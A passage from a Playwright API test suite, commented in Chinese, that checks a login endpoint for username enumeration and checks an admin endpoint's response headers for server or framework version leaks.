      data: { username: 'admin', password: 'definitely_wrong_password' },
    });
    const wrongPassBody = await wrongPassRes.text();
    const wrongPassStatus = wrongPassRes.status();

    // 两种情况的 HTTP 状态码应相同，防止通过状态码枚举用户名
    expect(nonExistentStatus).toBe(wrongPassStatus);

    // 响应体不应明确指出"用户不存在"，防止用户名枚举攻击
    expect(nonExistentBody.toLowerCase()).not.toContain('user not found');
    expect(nonExistentBody.toLowerCase()).not.toContain('用户不存在');
    expect(nonExistentBody.toLowerCase()).not.toContain('no such user');
  });

  test('响应头不应泄露服务器实现细节', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
    });

    const headers = response.headers();

    // 不应暴露 Web 框架或语言版本
    expect(headers['x-powered-by']).toBeUndefined();

    // Server 头不应包含具体版本号
    const serverHeader = headers['server'] || '';
    if (serverHeader) {
      // 不应暴露 axum/actix/rocket 等框架名及版本号
      expect(serverHeader).not.toMatch(/\d+\.\d+\.\d+/);
    }
  });
});
